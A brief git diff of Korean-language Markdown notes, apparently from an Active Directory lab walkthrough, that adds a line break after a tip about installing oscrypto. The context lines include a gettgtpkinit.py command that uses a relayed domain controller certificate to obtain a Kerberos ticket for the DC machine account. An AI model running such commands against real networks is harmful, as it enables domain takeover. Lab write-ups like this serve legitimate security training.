@@ -838,7 +838,7 @@ $ python3 -m venv .venv
 $ source .venv/bin/activate
 $ pip3 install -r requirements.txt
 ```
-> **참고:** `libcrypto 버전을 감지하는 중` 오류가 발생하면 [oscrypto](https://github.com/wbond/oscrypto) 라이브러리를 설치하여 문제를 해결
+> **참고:** `libcrypto 버전을 감지하는 중` 오류가 발생하면 [oscrypto](https://github.com/wbond/oscrypto) 라이브러리를 설치하여 문제를 해결<br/>
 ```$ pip3 install -I git+https://github.com/wbond/oscrypto.git```<br/>
 
 ```$ python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache```<br/>
